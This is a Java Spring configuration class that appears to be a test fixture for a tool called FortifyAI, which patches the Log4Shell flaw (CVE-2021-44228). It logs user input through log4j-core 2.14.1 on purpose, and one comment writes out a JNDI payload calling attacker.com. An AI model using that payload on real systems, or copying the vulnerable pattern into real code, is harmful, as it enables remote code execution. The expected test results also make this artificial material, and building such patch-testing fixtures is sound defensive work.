package com.example.core.config;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;

/**
 * SC-01: HAPPY PATH scenario (Log4j — patch upgrade, no breaking changes)
 *
 * CVE-2021-44228: log4j-core 2.14.1 — Log4Shell JNDI injection (Critical).
 * Fix: 2.14.1 → 2.17.0 (patch upgrade, LogManager/Logger APIs stable)
 *
 * Expected FortifyAI behaviour:
 *   API Diff    → has_breaking_changes=False
 *   AI Reasoning → confidence=high, pre_fix_required=False
 *   Routing     → adr_fix directly
 *
 * ⚠️  ATTACK SURFACE: Any user-controlled string reaching logger.info()
 *     is a JNDI injection vector in 2.14.1.
 */
@Configuration
@ComponentScan(basePackages = "com.example")
public class AppConfig {

    // ⚠️  LogManager.getLogger — Log4Shell attack surface in 2.14.1
    private static final Logger logger = LogManager.getLogger(AppConfig.class);

    @Bean
    public String appName() {
        // ⚠️  user input reaching here → RCE via ${jndi:ldap://attacker.com/x}
        String name = System.getProperty("app.name", "fortifyai-test");
        logger.info("Application starting: {}", name);
        return name;
    }

    public void logUserAction(String action) {
        // ⚠️  Direct user input logged — vulnerable in log4j-core 2.14.1
        logger.info("User action: {}", action);
    }
}
